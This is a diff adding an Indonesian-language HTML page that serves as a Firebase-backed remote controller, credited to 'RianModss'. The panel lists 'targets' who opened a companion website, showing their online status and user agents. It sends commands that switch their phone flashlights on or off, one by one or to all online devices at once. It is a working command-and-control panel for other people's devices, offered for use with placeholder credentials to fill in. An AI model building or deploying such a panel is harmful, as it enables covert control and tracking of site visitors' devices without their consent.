@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Controller Senter Remote</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        body {
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid #00ff00;
+            padding-bottom: 10px;
+            font-size: 24px;
+        }
+        h1 span {
+            color: #ff0000;
+            font-size: 14px;
+            display: block;
+        }
+        .stats {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 5px;
+        }
+        .target-list {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 15px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+        }
+        .target-item {
+            border: 1px solid #333;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            background: #1a1a1a;
+        }
+        .target-info {
+            flex: 1;
+        }
+        .target-id {
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .target-status {
+            color: #ffff00;
+            font-size: 12px;
+        }
+        .flashlight-status {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 3px;
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 5px;
+        }
+        .status-on {
+            background: #00ff00;
+            color: black;
+        }
+        .status-off {
+            background: #333;
+            color: #666;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        button {
+            background: #00ff00;
+            color: black;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+            flex: 1;
+        }
+        button:hover {
+            background: #00cc00;
+            transform: scale(0.98);
+        }
+        button.on-btn {
+            background: #00ff00;
+        }
+        button.off-btn {
+            background: #ff0000;
+            color: white;
+        }
+        button.off-btn:hover {
+            background: #cc0000;
+        }
+        .broadcast-section {
+            background: #111;
+            border: 1px solid #00ff00;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .broadcast-btn {
+            background: #ff00ff;
+            color: white;
+            font-size: 18px;
+            padding: 15px;
+            width: 100%;
+            margin: 5px 0;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #666;
+            font-size: 12px;
+            border-top: 1px solid #333;
+            padding-top: 20px;
+        }
+        .online-count {
+            color: #00ff00;
+            font-weight: bold;
+            font-size: 20px;
+        }
+    </style>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1>
+            🔦 SENTER REMOTE CONTROLLER
+            <span>© Architect 02 - RianModss</span>
+        </h1>
+        
+        <div class="stats" id="stats">
+            📊 TARGET ONLINE: <span class="online-count" id="onlineCount">0</span>
+        </div>
+        
+        <div class="target-list" id="targetList">
+            <h3>🎯 TARGET TERSAMBUNG:</h3>
+            <div id="targets">
+                <p style="color: #666; text-align: center;">Menunggu target buka website...</p>
+            </div>
+        </div>
+        
+        <div class="broadcast-section">
+            <h3>📢 BROADCAST KE SEMUA TARGET</h3>
+            <button class="broadcast-btn on-btn" onclick="broadcastTorch('on')">
+                🔦 NYALAIN SENTER SEMUA
+            </button>
+            <button class="broadcast-btn off-btn" onclick="broadcastTorch('off')">
+                ⚫ MATIIN SENTER SEMUA
+            </button>
+            <p style="color: #666; margin-top: 10px; font-size: 12px;">
+                *Semua target yang online bakal nyala/mati serentak
+            </p>
+        </div>
+        
+        <div class="footer">
+            ⚡ REAL-TIME CONTROL VIA FIREBASE<br>
+            Copyright © RianModss
+        </div>
+    </div>
+
+    <script>
+        // GANTI PAKE CONFIG FIREBASE LU!
+        const firebaseConfig = {
+            apiKey: "AIzaSyA...", // GANTI!
+            authDomain: "senter-remote.firebaseapp.com",
+            databaseURL: "https://senter-remote-default-rtdb.firebaseio.com", // GANTI!
+            projectId: "senter-remote",
+            storageBucket: "senter-remote.appspot.com",
+            messagingSenderId: "123456789",
+            appId: "1:123456789:web:abc123"
+        };
+        
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        
+        // Referensi ke semua target
+        const targetsRef = database.ref('targets');
+        
+        // Update UI ketika ada target baru
+        targetsRef.on('value', (snapshot) => {
+            const targets = snapshot.val();
+            const targetsDiv = document.getElementById('targets');
+            const onlineCount = document.getElementById('onlineCount');
+            
+            if (!targets) {
+                targetsDiv.innerHTML = '<p style="color: #666; text-align: center;">Belum ada target buka website...</p>';
+                onlineCount.innerText = '0';
+                return;
+            }
+            
+            let html = '';
+            let count = 0;
+            
+            // Loop setiap target
+            Object.keys(targets).forEach(key => {
+                const target = targets[key];
+                const lastSeen = new Date(target.lastSeen);
+                const now = new Date();
+                const diffMinutes = Math.floor((now - lastSeen) / 60000);
+                
+                // Anggep online kalo lastSeen < 2 menit
+                const isOnline = diffMinutes < 2;
+                if (isOnline) count++;
+                
+                const flashlightStatus = target.flashlight === 'on' ? 'ON' : 'OFF';
+                const flashlightClass = target.flashlight === 'on' ? 'status-on' : 'status-off';
+                
+                html += `
+                    <div class="target-item">
+                        <div class="target-info">
+                            <div class="target-id">📱 ${key}</div>
+                            <div class="target-status">
+                                ${isOnline ? '🟢 ONLINE' : '🔴 OFFLINE'} | 
+                                Last: ${lastSeen.toLocaleTimeString()} | 
+                                UA: ${target.userAgent ? target.userAgent.substring(0, 30) : 'unknown'}...
+                            </div>
+                            <div>
+                                <span class="flashlight-status ${flashlightClass}">
+                                    🔦 SENTER: ${flashlightStatus}
+                                </span>
+                            </div>
+                        </div>
+                        <div class="controls">
+                            <button class="on-btn" onclick="sendCommand('${key}', 'on')">NYALAIN</button>
+                            <button class="off-btn" onclick="sendCommand('${key}', 'off')">MATIIN</button>
+                        </div>
+                    </div>
+                `;
+            });
+            
+            targetsDiv.innerHTML = html || '<p style="color: #666; text-align: center;">Belum ada target...</p>';
+            onlineCount.innerText = count;
+        });
+        
+        // Fungsi kirim command ke target tertentu
+        function sendCommand(targetId, state) {
+            database.ref('commands/' + targetId).set({
+                torch: state,
+                timestamp: new Date().toISOString()
+            });
+            
+            // Notifikasi
+            alert(`✅ Command dikirim ke ${targetId}: SENTER ${state.toUpperCase()}`);
+        }
+        
+        // Fungsi broadcast ke semua target
+        function broadcastTorch(state) {
+            targetsRef.once('value', (snapshot) => {
+                const targets = snapshot.val();
+                if (!targets) {
+                    alert('❌ Ga ada target!');
+                    return;
+                }
+                
+                let count = 0;
+                Object.keys(targets).forEach(key => {
+                    const lastSeen = new Date(targets[key].lastSeen);
+                    const now = new Date();
+                    const diffMinutes = Math.floor((now - lastSeen) / 60000);
+                    
+                    // Cuma kirim ke yang online (< 2 menit)
+                    if (diffMinutes < 2) {
+                        database.ref('commands/' + key).set({
+                            torch: state,
+                            timestamp: new Date().toISOString()
+                        });
+                        count++;
+                    }
+                });
+                
+                alert(`✅ Broadcast ke ${count} target: SENTER ${state.toUpperCase()}`);
+            });
+        }
+    </script>
+</body>
+</html>
